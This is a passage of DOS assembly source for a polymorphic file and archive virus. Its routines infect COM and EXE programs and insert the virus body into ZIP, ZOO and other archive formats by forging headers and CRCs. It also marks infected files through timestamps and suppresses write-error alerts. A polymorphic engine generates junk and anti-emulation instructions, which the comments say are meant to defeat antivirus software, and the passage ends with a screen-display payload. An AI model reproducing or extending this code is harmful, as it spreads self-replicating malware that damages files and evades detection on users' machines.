   mov word ptr cs:[zipseg],ax

   mov ah,3fh
   mov cx,01Eh
   mov dx,offset temporary1
   int 21h                                            ; reade one header

   cmp word ptr cs:[temporary1],04B50h                ; verify integrity
   jne invalid_zip

   mov ax,word ptr cs:[temporary1+0ah]
   and al,00001111b
   cmp al,00001010b
   je invalid_zip

   mov ax,word ptr cs:[temporary1+0ah]
   and al,11110000b
   add al,00001010b
   mov word ptr cs:[temporary1+0ah],ax                     ; check infected

   xor ax,ax
   call go

   mov ah,40h
   mov cx,01Eh
   mov dx,offset temporary1
   int 21h                                         ; mark as infected

   mov ax,2
   call go

   cmp ax,4000
   ja zipsubit

   cmp dx,0
   jne zipsubit

   mov ax,4000

   zipsubit:

   sub ax,4000
   sbb dx,0

   push ax
   push dx
   pop cx
   pop dx

   xor ax,ax
   call gozero                                     ; scan the last 5000 bytes
                                                   ; for the end of central
   mov ds,word ptr cs:[zipseg]

   mov ah,3fh
   mov cx,5000
   mov dx,0
   push cx
   int 21h

   pop cx
   mov bp,5000

   zip_testsignature:
   cmp word ptr ds:[bp],04b50h                             ; end of central
   je zip_continue
   zipozero:
   dec bp
   dec cx
   jnz zip_testsignature

   invalid_zip:

   push cs
   mov es,word ptr cs:[zipseg]
   mov bp,36000/16
   call delocate                                   ; delocate zip
   pop es

   ret                                             ; return

   zip_continue:

   cmp word ptr ds:[bp+2],0605h
   jnz zipozero

   mov cx,word ptr ds:[bp+10h+2]
   mov dx,word ptr ds:[bp+10h]

   cmp word ptr ds:[bp+0ch+2],0
   jne invalid_zip

   cmp word ptr ds:[bp+0ch],30000                  ; check for over limit
   ja invalid_zip

   xor ax,ax
   call gozero

   push ax
   push dx

   mov ah,3fh
   mov cx,word ptr ds:[bp+0ch]
   mov dx,5000
   int 21h

   push bp
   call Zip_file_header                                    ; build a zip header
   pop bp

   pop cx
   pop dx

   xor ax,ax
   call gozero

   mov word ptr cs:[zipoffst],ax
   mov word ptr cs:[zipoffst+2],dx

   push ds
   push cs
   pop ds

   mov ah,40h
   mov cx,word ptr cs:[namesize]
   add cx,1eh
   mov dx,offset temporary1
   int 21h                                         ; write file header

   call write_virus                                ; write virus

   pop ds

   mov ax,1
   call go

   mov word ptr ds:[bp+10h],ax
   mov word ptr ds:[bp+10h+2],dx

   push bp
   call Zip_central                                ; build central header
   pop bp

   mov ah,40h
   mov cx,word ptr ds:[bp+0Ch]
   mov dx,5000
   int 21h                                         ; write endofcentral block

   push ds

   mov ah,40h
   mov cx,word ptr cs:[namesize]
   add cx,2eh
   push cx
   push cs
   pop ds
   mov dx,offset temporary1+256
   int 21h                                         ; write our endofcentral pack
   pop cx
   pop ds

   add word ptr ds:[bp+0Ch],cx
   mov word ptr ds:[bp+0Ch+2],0
   inc word ptr ds:[bp+08h]
   inc word ptr ds:[bp+0Ah]

   mov ah,40h
   mov cx,word ptr ds:[bp+14h]
   add cx,16h
   mov dx,bp
   int 21h                                         ; write the end of central

   jmp invalid_zip

   Zip_central:

   push es
   push ds

   mov si,5000
   lea di,[temporary1+256]

   push di

   mov cx,2Eh
   repz movsb

   pop bp

   push cs
   pop ds

   mov cx,word ptr cs:[precrc32cx]                 ; set crc
   mov dx,word ptr cs:[precrc32dx]

   mov word ptr cs:[bp+10h],cx
   mov word ptr cs:[bp+10h+2],dx

   mov ax,word ptr cs:[totalsize]                  ; set size
   mov word ptr cs:[bp+14h],ax
   mov word ptr cs:[bp+14h+2],0
   mov word ptr cs:[bp+18h],ax
   mov word ptr cs:[bp+18h+2],0

   mov cx,word ptr cs:[namesize]
   mov word ptr cs:[bp+1Ch],cx

   mov word ptr cs:[bp+24h],0
   mov word ptr cs:[bp+0ah],0
   mov word ptr cs:[bp+1eh],0
   mov word ptr cs:[bp+20h],0

   mov ax,word ptr cs:[zipoffst]
   mov dx,word ptr cs:[zipoffst+2]
   mov word ptr cs:[bp+2ah],ax
   mov word ptr cs:[bp+2ah+2],dx

   mov si,offset betaname                          ; set the name
   lea di,[bp+2Eh]

   repz movsb

   pop ds
   pop es

   ret

   Zip_file_header:

   push es
   push ds

   push cs cs
   pop ds es

   mov bp,offset temporary1

   mov word ptr cs:[bp+06h],0
   mov word ptr cs:[bp+08h],0
   mov word ptr cs:[bp+1Ch],0

   mov cx,word ptr cs:[precrc32cx]                 ; fix the crc
   mov dx,word ptr cs:[precrc32dx]

   mov word ptr cs:[bp+0Eh],cx                     ; fix the file offset in zip
   mov word ptr cs:[bp+0Eh+2],dx

   mov ax,word ptr cs:[totalsize]                  ; fix the size

   mov word ptr cs:[bp+12h],ax
   mov word ptr cs:[bp+12h+2],0
   mov word ptr cs:[bp+16h],ax
   mov word ptr cs:[bp+16h+2],0

   call set_a_name                                 ; fix the name
   dec cx

   mov word ptr cs:[bp+01Ah],cx
   mov word ptr cs:[namesize],cx

   mov si,offset betaname
   lea di,[bp+1Eh]

   repz movsb

   pop ds
   pop es

   ret

   infect_zoo:                                     ; infect zoo

   mov ah,3fh
   mov cx,256
   mov dx,offset temporary1                        ; read first 256 bytes
   int 21h

   mov si,offset temporary1
   add si,word ptr cs:[temporary1+18h]
   cmp word ptr cs:[si],0A7DCh                     ; check validity
   jne invalid_zoo

   mov al,byte ptr cs:[temporary1+20]
   cmp al,byte ptr cs:[test_signature+1]
   je invalid_zoo

   call zoo_header                                 ; build a zoo header

   xor cx,cx
   mov dx,20

   xor ax,ax
   call gozero                                     ; go at 0000020h

   mov ah,40h
   mov cx,1
   mov dx,offset test_signature+1                  ; write our signature
   int 21h

   mov al,2
   call go

   push ax
   push dx

   sub ax,96
   sbb cx,0

   push dx
   push ax
   pop dx
   pop cx

   xor ax,ax
   call gozero                                   ; goto fin-96

   mov ah,3fh
   mov cx,96
   mov dx,offset temporary1+256
   int 21h                                         ; read 96 bytes

   mov si,offset temporary1+256+96

   zoo_scan:

   cmp word ptr cs:[si],0FDC4h                     ; test integrity
   je test_signature
   Zoo_continue:

   dec si
   dec cx
   jnz zoo_scan

   pop dx
   pop ax

   invalid_zoo:

   ret

   test_signature:

   cmp word ptr cs:[si-2],0A7DCh                           ; test integrity
   jne zoo_continue

   mov bp,96
   sub bp,cx
   add bp,2

   pop cx
   pop dx

   sub dx,bp
   sbb cx,0

   push cx
   push dx

   add dx,26h+13+15
   adc cx,0

   mov word ptr cs:[di+10],dx                     ; set offset of next header
   mov word ptr cs:[di+10+2],cx

   add dx,word ptr cs:[totalsize]
   adc cx,0

   mov word ptr cs:[di+6],dx
   mov word ptr cs:[di+6+2],cx

   pop dx
   pop cx

   xor ax,ax
   call gozero                                     ; go at begining

   push ax
   push dx

   mov cx,bp
   mov ah,3fh
   mov dx,offset temporary1+256
   int 21h                                         ; read 256 bytes

   pop cx
   pop dx

   xor ax,ax
   call gozero                                     ; go at the beging

   mov ah,40h
   mov cx,26h+13+15
   mov dx,offset temporary1
   add dx,word ptr cs:[temporary1+18h]
   int 21h                                         ; write our header+virus

   call write_virus

   mov ah,40h
   mov cx,bp
   mov dx,offset temporary1+256
   int 21h                                         ; write last packet

   jmp invalid_zoo

   zoo_header:

   mov bp,si
   mov byte ptr cs:[bp+5],00

   mov dx,word ptr cs:[precrc16]                   ; set crc
   mov word ptr cs:[bp+12h],dx

   mov word ptr cs:[bp+1Fh],0
   mov word ptr cs:[bp+1Fh+2],0
   mov word ptr cs:[bp+1Fh+4],0

   mov ax,word ptr cs:[totalsize]                  ; set size
   mov word ptr cs:[bp+14h],ax
   mov word ptr cs:[bp+14h+2],0

   mov word ptr cs:[bp+18h],ax
   mov word ptr cs:[bp+18h+2],0

   call set_a_name

   mov si,offset betaname
   lea di,[bp+26h]

   repz movsb

   mov di,bp

   ret

   get_host:                                       ; get extension from ds:si

   mov cx,256

   stoof:

   cmp byte ptr ds:[si],2Eh
   je test_ext

   inc si
   dec cx

   jnz stoof

   test_ext:

   mov bp,offset list0
   mov cl,byte ptr cs:[nblist]

   test_extension:

   mov ax,word ptr ds:[si+1]
   cmp word ptr cs:[bp],ax
   je ext_verify2

   add ax,2020h                                            ; check for maj/min
   cmp word ptr cs:[bp],ax                                 ; from the lis
   jne not_correct

   ext_verify2:

   mov al,byte ptr ds:[si+3]                               ;
   cmp byte ptr cs:[bp+2],al                               ;
   je allokay

   add al,20h
   cmp byte ptr cs:[bp+2],al
   jne not_correct

   allokay:

   mov di,word ptr cs:[bp+3]                               ; if found fix
   mov si,word ptr cs:[bp+5]                               ; where we return
   mov word ptr cs:[offreturn],si                          ; and the infection
   ret                                                     ; routine

   not_correct:

   add bp,7
   dec cl
   jnz test_extension                                      ; else return with
   sub ax,-1                                               ; carry

   do_nothing:
   ret

   nblist: db 12                                           ; infection list
   list0:

   db      'com'
   dw      offset infect_com
   dw  offset return_com

   db     'zip'
   dw     offset infect_zip
   dw     offset playingload

   db     'arj'
   dw     offset infect_arj
   dw     offset playingload

   db     'rar'
   dw     offset infect_rar
   dw     offset playingload

   db     'ace'
   dw     offset infect_ace
   dw     offset playingload

   db     'ha',0
   dw     offset infect_ha
   dw     offset playingload

   db     'arc'
   dw     offset infect_arc
   dw     offset playingload

   db     'pak'
   dw     offset infect_arc
   dw     offset playingload

   db     'lzh'
   dw     offset infect_lzh
   dw     offset playingload

   db     'lha'
   dw     offset infect_lzh
   dw     offset playingload

   db     'zoo'
   dw     offset infect_zoo
   dw     offset playingload

   db      'exe'
   dw  offset infect_exe
   dw  offset return_exe

   ret

   openf:                                          ; open file in write mode
                                                   ; save all etc etc
   mov ax,4300h-1
   inc ax
   mov dx,si
   int 21h
   mov cx,offset cs:[temporaryattr]

   mov ax,4301h-1
   inc ax
   xor cx,cx
   mov dx,si
   int 21h
   jc openf_security_fail

   mov ax,3D02h
   mov dx,si
   int 21h

   xchg ax,bx
   xor ax,ax
   ret

   openf_security_fail:

   sub ah,-1                                       ; if fail return with carry
   ret

   closef:

   mov ax,2
   call go

   mov word ptr cs:[finallowsize],ax
   mov word ptr cs:[finalhisize],dx

   mov ax,5801h                                  ; close the file & restore
   dec ah
   mov cx,word ptr cs:[temporaryhour]              ; all
   and cl,11110000b
   add cl,00001010b
   mov dx,word ptr cs:[temporarydate]
   int 21h

   mov ah,3eh
   int 21h

   mov ax,4301h-1
   inc ax
   mov cx,word ptr cs:[temporaryattr]
   mov dx,si
   int 21h

   ret

   poly:                                   ; here's the poly

   push ax
   push cs
   pop  es

   mov word ptr cs:[cryptbuff],offset starttable+1024-1

   mov ax,word ptr cs:[databuff]
   shr dx,8
   mul dx
   mov cx,1024/2

   mov di,offset starttable+1024
   push di

   looptable:                                      ; build our table
   mov bx,ax
   xor bh,bh
   shl bx,2
   add ax,bx
   xor ax,2481h
   stosw
   dec cx
   jnz looptable                       ; generate a table to

   pop si                          ; have a maximum
   mov di,0                                                ; of random values
   pop es

   mov dx,word ptr cs:[prepared]
   push dx

   mov word ptr es:[di],00e8h          ; call gegen
   mov byte ptr es:[di+2],00h
   add di,3

   mov al,byte ptr cs:[regged]         ; pop regged
   call make_a_pop
   mov byte ptr es:[di],ah
   inc di

   mov al,byte ptr cs:[regged]         ; lea verified,reg+start+crypt
   push ax
   call reg_to_mem_binmodification
   pop ax
   call make_a_lea
   mov word ptr es:[di],ax
   add di,4

   mov al,byte ptr cs:[regged]
   mov dh,byte ptr cs:[verifyreg]
   push dx
   call make_a_mov_r_r             ; mov verified ,regged
   pop dx

   mov cl,dh
   call make_an_op                 ; add regged , fin-start
   add di,2

   mov al,byte ptr cs:[sliding]
   call make_a_mov
   add di,2                    ; make the value in the mov

   mov word ptr es:[di],00e8h          ; call gegen
   mov byte ptr es:[di+2],00h
   add di,3

   mov al,byte ptr cs:[verifyreg]
   call make_a_push                ; push verifyreg
   mov byte ptr es:[di],ah
   inc di

   mov al,byte ptr cs:[regged]         ; mov operated,[regged]
   Call Reg_To_Mem_BinModification
   mov al,byte ptr cs:[operated]
   call make_a_mov_r_v
   mov byte ptr es:[di],0
   inc di

   ; ************************************************************************
   pop dx

   mov ch,byte ptr cs:[operated]
   xor dh,dh
   inc dx
   shl dx,1
   mov bp,dx                   ; bp = number of instructions
   cmp bp,256
   ja makenewop
   add bp,100

   makenewop:
   mov dx,word ptr cs:[si]             ; dx = random value (see upper)
   xor cl,dl
   push si
   mov si,word ptr cs:[cryptbuff]
   call those_op                   ; render one instruction
   mov word ptr cs:[cryptbuff],si
   pop si                      ; of the decryptor/encryptor
   inc si
   dec bp
   jne makenewop

   mov byte ptr cs:[starttable+1024-1],0c3h    ; create test.com

   mov al,byte ptr cs:[regged]         ; mov [regged],operated
   Call Reg_To_Mem_BinModification
   mov al,byte ptr cs:[operated]
   call make_a_mov_v_r
   mov byte ptr es:[di],0
   inc di

   mov al,byte ptr cs:[verifyreg]
   call make_a_pop             ; push verifyreg
   mov byte ptr es:[di],ah
   inc di

   mov ah,40H
   add ah,byte ptr cs:[regged]
   mov byte ptr es:[di],ah
   inc di
   mov byte ptr es:[di],ah
   inc di

   mov ax,1100000000111011b
   add ah,byte ptr cs:[verifyreg]
   mov dl,byte ptr cs:[regged]
   shl dl,3
   add ah,dl
   mov word ptr es:[di],ax
   add di,2

   mov ax,0774h
   mov word ptr es:[di],ax
   add di,2

   mov al,byte ptr cs:[tempreg]            ; pop regged
   call make_a_pop
   mov byte ptr es:[di],ah
   inc di

   mov cl,byte ptr cs:[tempreg]
   call make_an_op                 ; add regged , fin-start
   sub di,1
   add byte ptr es:[di],00101000b
   add di,1

   mov ax,0003h
   mov word ptr es:[di],ax
   add di,2

   mov al,byte ptr cs:[tempreg]
   call make_a_push                ; push verifyreg
   mov byte ptr es:[di],ah
   inc di

   mov ax,58c3h
   mov word ptr es:[di],ax
   add di,2

   mov word ptr es:[06],di
   sub word ptr es:[06],3
   mov ax,fin-start
   mov word ptr es:[12],ax
   add di,ax
   mov word ptr cs:[totalsize],di
   mov si,offset start
   add si,ax
   shr ax,1
   mov cx,ax
   add cx,1

   mov al,byte ptr cs:[sliding]            ; pop regged
   call make_a_pop
   mov byte ptr cs:[popslidin],ah

   mov al,byte ptr cs:[operated]           ; pop operate
   call make_a_pop
   mov byte ptr cs:[popoper],ah

   mov al,byte ptr cs:[sliding]            ; push regged
   call make_a_push
   mov byte ptr cs:[pushslidin],ah

   mov al,byte ptr cs:[operated]           ; push operate
   call make_a_push
   mov byte ptr cs:[pushoper],ah

   mov ax,word ptr cs:[predifinedkey]
   mov word ptr cs:[slidingprev],ax

   OurLoop1:
   push cx
   pusha
   push di
   mov ax,word ptr cs:[Slidingprev]
   push ax
   mov ax,word ptr cs:[si]
   push ax
   popoper:    nop                 ; pop operated1
   popslidin:  nop                 ; pop slidin
   call word ptr cs:[cryptbuff]
   pushslidin: nop
   pop ax
   mov word ptr cs:[slidingprev],ax
   pushoper:   nop
   pop ax
   pop di
   mov word ptr es:[di],ax
   popa
   pop cx
   sub di,2
   sub si,2
   dec cx
   jnz ourLoop1

   mov ax,word ptr cs:[slidingprev]
   mov word ptr es:[15],ax

   ret

   Make_a_lea:                                   ; save lea ... bzzz save lea...

       push    cx
       push    dx
       mov dl,8Dh
       mov ah,10000000b
       add ah,dh
       shl al,3
       add ah,al
       mov dh,ah
       mov ax,dx
       pop dx
       pop cx
           ret

   Reg_to_Mem_Binmodification:
   ; The Intel Shit use a non comprehensible way for converting a reg into a mem
   ; address
   ; dl = register
   ; dh = memory register

       mov dh,00000100b
       cmp al,00000110b
       je  M_a_l_0

       mov dh,00000110b
       cmp al,00000101b
       je  M_a_l_0

       mov dh,00000101b
       cmp al,00000111b
       je  M_a_l_0

       mov dh,00000111b

   M_a_l_0:        ret

   get_the_mem_reg:

   cmp ch,00000100b
   ja skipadd_it
   mov ch,00000011b
   skipadd_it:
   ret

   Make_A_push:
   ;
   ;       This make a push
   ;       al = 16 bit reg
   ;       in ds:si
   ;
           mov     ah,01010000b
           jmp     M_P

   Make_A_Pop:
   ;
   ;       This make a pop
   ;       al = 16 bit reg
   ;       in ds:si
   ;
           mov     ah,01011000b            ; val for Pop
   M_P:    add     ah,al
           ret
   verify0:

   verify_reg:

   cmp ch,00000100b
   jne not_sp
   inc ch
   not_sp:

   cmp ch,00000000b
   jne not_ax
   inc ch

   not_ax:
   cmp ch,byte ptr cs:[bp+regged]
   jne not_operated
   inc ch
   cmp ch,00000111b
   jna verify_reg
   mov ch,1
   jmp verify_reg

   not_operated:
   cmp ch,byte ptr cs:[bp+sliding]
   jne not_sliding
   inc ch
   cmp ch,00000111b
   jna verify_reg
   mov ch,1
   jmp verify_reg

   not_sliding:
   cmp ch,byte ptr cs:[bp+operated]
   jne not_lastone
   inc ch
   cmp ch,00000111b
   jna verify_reg
   mov ch,1
   jmp verify_reg

   not_lastone:
   cmp ch,byte ptr cs:[bp+lastone]
   jne not_regged
   inc ch
   cmp ch,00000111b
   jna verify_reg
   mov ch,1
   jmp verify_reg

   not_regged:
   ret

   make_a_mov_v_r:                                 ; create a mov [],reg

           push    ax
       mov ax,892eh
           mov     word ptr es:[di],ax
       add di,2
       pop ax
       push    ax
           mov     ah,01000000b
           add     ah,dh
           shl     al,3
           add     ah,al
           mov     byte ptr es:[di],ah
       inc     di
       pop ax
       ret

   make_a_mov_r_v:                                         ; mov ax,[]

           push    ax
       mov ax,8b2eh
           mov     word ptr es:[di],ax
       add di,2
       pop ax
       push    ax
           mov     ah,01000000b
           add     ah,dh
           shl     al,3
           add     ah,al
           mov     byte ptr es:[di],ah
       inc     di
       pop ax
       ret

   Make_a_mov:

   ;
   ;       Add a mov 16_bit_reg,
   ;       In      DS:SI
   ;       Put     your variable after
   ;
           push    ax
       mov ah,0B8h
           add     ah,al
       mov byte ptr es:[di],ah
       inc di

       pop ax
       ret

   make_a_mov_r_r:

           push    ax
       mov ah,08Bh
           mov     byte ptr es:[di],ah
       inc di
           mov     ah,0c0h
           add     ah,al
           shl     dh,3
           add     ah,dh
           mov     byte ptr es:[di],ah
       inc     di
       pop ax
       ret

   fixAdd: pop     cx                                      ; See upper
       cmp cl,0
       jne     notax

       mov ah,05
       mov byte ptr es:[di],ah
       inc     di
       jmp axright

   notax:  mov     ax,1100000010000001b
       add ah,cl
       mov     word ptr es:[di],ax
       add di,2

   axright:        mov     word ptr es:[di],dx
       add     di,2
           pop     ax
           ret

   Make_AN_OP:

   ;
   ;       It's add a classic operation : Add ,xor ,or ,and , sub etc etc
   ;       in DS:SI        ,       this fix also the add ax, 2 bytes only
   ;       cl = 16 bits Register
   ;       dx = value
   ;

           push    ax cx
       mov     ax,1100000010000001b
       add ah,cl

       mov word ptr es:[di],ax
       add di,2

           pop     ax
       pop cx
           ret

   those_op:
   push cx
   and cl,00000001b
   cmp cl,00000001b
   pop cx
   je thop0
   jmp make_a_noise                ; generate a junk 1 chance / 2

   thop0:
   push cx
   and cl,01000000b
   cmp cl,01000000b
   pop cx
   jne thop1
   jmp make_op_reg_val             ; generate a real xor ax,xxxx
                           ; 1/4
   thop1:
   push cx
   and cl,10000000b
   cmp cl,10000000b
   pop cx
   jne thop2
   jmp make_op_r_r                 ; generate a real add ax,keyreg
                           ; 1/8
   thop2:
   push cx
   and cl,00000100b
   cmp cl,00000100b
   pop cx
   jne thop3
   jmp make_a_dec_adv              ; dec/inc the keyreg 1/16

   thop3:
   jmp make_a_rorl
   ret

   make_a_noise:
   cmp byte ptr cs:[lastone],1
   je make_op_r_r
   mov byte ptr cs:[lastone],1

   push cx ax

   push cx                     ; test for interuption call
   and cl,00111100b                ; routine
   cmp cl,00111100b
   pop cx
   je make_advanced_noise

   push dx

   and cl,00000111b
   push bp
   xor bp,bp
   call verify_reg                 ; check to doesn't hurt real
   pop bp
   push cx                     ; reg used by us

   mov ch,dh
   and ch,00000111b
   push bp
   xor bp,bp
   call verify_reg                 ; check to doesn't hurt real
   pop bp
   shl ch,3                    ; reg used by us
   mov dh,ch

   pop cx

   add ch,dh                   ; prepare to do a mov reg,reg
   and ch,00111111b

   pop dx

   and dh,00111000b
   cmp dh,00111000b
   jne put_tha_good
   and dh,00110000b                ; check for not compare
   put_tha_good:                   ; don't want any confusion
   mov ax,1100000000000011b
   add al,dh
   add ah,ch
   mov word ptr es:[di],ax
   add di,2

   pop ax cx
   ret                     ; that's added into di

   make_advanced_noise:                ; put some interrupt and
   pop ax cx                   ; anti emulating trick
   push ax cx                  ; to phuck av

   add cl,01010101b
   and cl,00000011b

   mov al,cl
   xor ah,ah
   mov bx,4
   mul bx
   mov bx,ax

   mov ax,word ptr cs:[bx+no_action_interrupt]
   mov word ptr es:[di],ax

   mov ax,word ptr cs:[bx+no_action_interrupt+2]
   mov word ptr es:[di+2],ax

   add di,4
   pop cx ax
   ret

   make_op_r_r:

   cmp byte ptr cs:[lastone],2
   je make_op_reg_val

   mov byte ptr cs:[lastone],2

   push cx ax

   and cl,00101000b
   cmp cl,0
   je make_op0

   and cl,00001000b
   add cl,00001000b
   add cl,00100000b

   make_op0:

   mov ax,1100000000000011b

   push ax
   add al,cl               ; cl is the instruction
   shl ch,3                ; ch contains the destination reg

   add ch,byte ptr cs:[sliding]        ; add to ch the key reg
   add ah,ch

   mov word ptr es:[di],ax         ; ax = the builded instruction
   add di,2

   cmp cl,00110000b
   je skipchange

   cmp cl,0
   jne skipchange0

   mov cl,00101000b
   jmp skipchange

   skipchange0:

   mov cl,0

   skipchange:
   pop ax
   add al,cl
   add ah,ch

   mov word ptr cs:[si-2],ax
   sub si,2

   pop ax cx
   ret

   make_op_reg_val:
   cmp byte ptr cs:[lastone],3     ; compare if there's already a ror
   ;je make_a_rorl             ; don't have two time ror rol or
   mov byte ptr cs:[lastone],3     ; vice versa !
   push cx

   and cl,00101000b            ; test for instruction validity
   cmp cl,0
   je make_op

   and cl,00001000b            ; just permit xor add sub
   add cl,00001000b            ;
   add cl,00100000b

   make_op:

   push cx
   call make_an_op0                ; build that operation
   pop cx

   cmp cl,00110000b
   je skipchangea

   cmp cl,0
   jne skipchange0a

   mov cl,00101000b
   jmp skipchangea

   skipchange0a:

   mov cl,0

   skipchangea:
   push es
   push di

   push cs
   pop es

   push si
   pop di

   sub di,4
   call make_an_op0
   sub si,4

   pop di
   pop es

   pop cx
   ret

   make_a_rorl:                ; build a ror/rol
   cmp byte ptr cs:[lastone],4
   je make_a_dec_adv
   mov byte ptr cs:[lastone],4

   push ax cx
   xor ax,ax

   push cx
   and cl,00000010b
   cmp cl,00000010b
   pop cx
   je make_a_ror

   Make_a_rol: mov ah,0c8h             ; op code for rol
       mov ch,0c0h
           jmp     M_a_ir
   Make_a_ror:
       mov     ah,0c0h                 ; op code for ror
       mov     ch,0c8h
   M_a_ir: add     ah,byte ptr cs:[operated]       ; do it on operator key
       mov     al,0C1h                 ; opcode for ror/rol
       mov word ptr es:[di],ax
       add di,2
       add ch,byte ptr cs:[operated]
       mov ah,ch
       mov word ptr cs:[si-3],ax
       pop cx
       push    cx
       and cl,00000011b
       mov byte ptr es:[di],cl         ; put it on the buffar
       inc     di
       mov     byte ptr cs:[si-1],cl
       sub     si,3
       pop     cx ax
       ret

   make_a_dec_adv:
   cmp byte ptr cs:[lastone],5         ; don't have a inc/dec
   jne dontmake_a_noise                ; or dec/inc

   jmp make_a_noise

   dontmake_a_noise:
   mov byte ptr cs:[lastone],5

   push cx ax
   xor ax,ax
   push cx
   add cl,10101010b                    ; randomize more the
   and cl,00000100b                    ; numbah!
   cmp cl,00000100b
   pop cx

   je make_a_dec

   Make_a_inc:
           mov     ah,40h                  ; opcode for inc
       mov al,48h
           jmp     M_a_i
   Make_a_dec:
       mov     ah,48h                  ; opcode for dec
       mov     al,40h
   M_a_i:  add     ah,byte ptr cs:[sliding]        ; do it in the sliding
       add al,byte ptr cs:[sliding]
       mov byte ptr es:[di],ah         ; key
       inc di
       mov     byte ptr cs:[si-1],al
       dec     si

   pop ax cx                       ; return
   ret

   Make_AN_OP0:

   ;
   ;       It's add a classic operation : Add ,xor ,or ,and , sub etc etc
   ;       in DS:SI        ,       this fix also the add ax, 2 bytes only
   ;       cl = 16 bits Register
   ;       dx = value
   ;

           push    ax cx
       mov     ax,1100000010000001b
       add cl,byte ptr cs:[operated]
       add ah,cl

       mov word ptr es:[di],ax
       add di,2

           mov     word ptr es:[di],dx
       add di,2

           pop     ax
       pop cx
           ret

   no_action_interrupt:

   mov ah,0dh
   int 21h

   mov ah,01h
   int 16h

   mov ah,19h
   int 21h

   not sp
   not sp

   cryptbuff:  dw offset starttable-1
   slidingprev:    dw 0
   tempreg:    db 0
   verifyreg:  db 0
   regged:     db 0ffh
   lastone:    db 0ffh
   operated:   db 0ffh
   sliding:    db 0ffh

   preview_condition:

   pusha                                           ; test for poly conditions
   call polyallocator
   jc damned

   call polydelocator
   popa
   ret

   damned:
   popa
   sub ah,-1
   ret

   write_virus:                                   ; write the virus on disk

   push es
   push ds
   pusha

   mov ah,40h
   mov cx,word ptr cs:[totalsize]
   mov dx,0
   mov ds,word ptr cs:[genseg]
   int 21h

   popa
   pop ds
   pop es
   ret

   propoly:                                        ; generate poly trick

   push es
   push ds

   push cs
   push cs
   pop es
   pop ds

   pusha

   pusha
   call polyallocator
   mov ax,word ptr cs:[genseg]
   call poly                                       ; generate poly in ax:0
   popa

   push es
   pop ds

   xor si,si
   mov ds,word ptr cs:[genseg]
   mov cx,word ptr cs:[totalsize]

   call crc_calc

   mov word ptr cs:[precrc32cx],cx
   mov word ptr cs:[precrc32dx],dx

   xor si,si
   mov ds,word ptr cs:[genseg]
   mov cx,word ptr cs:[totalsize]

   call crc_calc16
   mov word ptr cs:[precrc16],dx

   popa
   pop ds
   pop es

   ret

   polyinit_value:                         ;

   mov ah,2ah-1
   inc ah
   int 21h

   mov word ptr cs:[bp+cryptbuff],cx
   mov word ptr cs:[bp+predifinedkey],cx

   mov ah,2ch
   int 21h                                                 ; get time

   mov word ptr cs:[bp+polytemporary],dx

   mov ch,dh
   mov cl,dh
   and ch,00000011b
   add ch,00000100b
   call get_the_mem_reg                ; set the memory reg
   mov byte ptr cs:[bp+regged],ch          ; it 'll be never touched

   mov ch,dh
   xor ch,135
   rcr ch,2
   and ch,00000111b
   call verify_reg                 ; verify to doesn't hurt other
   mov byte ptr cs:[bp+sliding],ch         ; reg & stack , set the sliding
                           ; key
   mov ch,dh
   xor ch,30
   add ch,10101010b
   rcl ch,1
   and ch,00000111b
   call verify_reg
   mov byte ptr cs:[bp+operated],ch        ; the operator register

   mov ch,dl
   xor ch,20
   add ch,10101010b
   rcl ch,1
   and ch,00000111b
   call verify_reg
   mov byte ptr cs:[bp+verifyreg],ch       ; the operator register

   mov ch,dl
   xor ch,10
   add ch,10101010b
   rcl ch,1
   and ch,00000111b

   verify_regtmp:
   call verify_reg
   mov byte ptr cs:[bp+tempreg],ch         ; the operator register

   not_tempreg:
   cmp ch,byte ptr cs:[bp+verifyreg]
   jne not_reggedtmp
   inc ch
   cmp ch,00000111b
   jna verify_regtmp
   mov ch,1
   jmp verify_regtmp

   not_reggedtmp:

   ret

   polyallocator:

   push es
   pusha
   mov bp,10000/16
   call allocate
   jc polyproblem
   mov word ptr cs:[genseg],ax
   popa
   pop es

   ret

   polyproblem:

   popa
   pop es
   sub ah,-1
   ret

   polydelocator:

   push es
   pusha
   mov es,word ptr cs:[genseg]
   call delocate
   popa
   pop es

   ret

   security_check:

   mov ah,19h
   int 21h

   cmp ah,1
   ja sec_next0

   xchg ax,dx

   mov ah,16h
   int 13h

   cmp ah,6
   je sec_next0

   sec_next1:

   sub ah,-1
   ret

   sec_next0:

   ret

   int24handler:                                   ;  no alert :p

   mov al,3
   mov byte ptr cs:[writeprot],1
   iret

   save_state:                             ; save all state

   mov word ptr cs:[savedes],es
   mov word ptr cs:[savedds],ds

   mov ax,3524h
   int 21h                                 ; save offset of int 24h

   mov word ptr cs:[old24seg],es
   mov word ptr cs:[old24off],bx

   push cs
   push cs
   pop ds
   pop es

   mov ax,2524h
   mov dx,offset int24handler
   int 21h

   ret

   restore_state:

   mov ds,word ptr cs:[old24seg]
   mov dx,word ptr cs:[old24off]

   mov ax,2524h
   int 21h                                         ; refix int 24h

   mov es,word ptr cs:[savedes]
   mov ds,word ptr cs:[savedds]

   ret

   test_inf:

   mov ax,3D00h                                    ; test if infected with
   int 21h                                         ; time stamp

   xchg ax,bx

   mov ax,5800h                                  ; fix time size
   dec ah
   int 21h
   mov word ptr cs:[temporarydate],cx
   mov word ptr cs:[temporaryhour],cx
   push cx
   push cx

   mov ah,3eh
   int 21h                                                 ; close the file

   pop cx
   and cl,00001111b
   cmp cl,00001010b
   pop cx
   je test_security_fail
   xor ax,ax
   ret

   test_security_fail:                                     ; fail ? return
                                                           ; with carry
   sub ah,-1
   ret

   payload:                                                ; a small payload
                                                           ; put an image on
   lea bp,[bp+trademark]                                   ; screen
   mov cx,fintrade-trademark

   mov ax,13h
   int 10h                                                 ; clear screen
                                                           ; fix video mode
   push 0a000h
   pop es

   mov ax,00ffh
   xor bx,bx
   call setcolor                                           ; set color 0ffh
   xor ax,ax                                               ; to 0,0,0
   xor bx,bx
   call setcolor                                           ; and color 0 too

   screenloop:

   push cx
   push bp

   mov ax,1301h
   mov bx,255
   mov cx,1
   mov dx,0

   push es

   push cs
   pop es
   int 10h                                               ; put a char on screen

   pop es

   call printchar                                          ; print big char
   call minifadeout                                        ; fade out pallette

   pop bp
   pop cx

   inc bp

   dec cx
   jnz screenloop

   ret                                             ; return

   minifadeout:

   mov ax,0FF07h                                   ; do it 55 times
   mov bx,0FFFFh
   push ax
   push bx
   mov cx,55

   loop_fadeit:                                    ; fade color-1

   sub ah,5
   sub bx,0505h
   call setcolor                                   ; wait for color
   call sync                                       ; wait for sync
   sub cx,5
   jnz loop_fadeit

   pop bx
   pop ax

   call setcolor                                   ; set the color

   ret

   sync:

   push ax
   mov dx, 3DAh
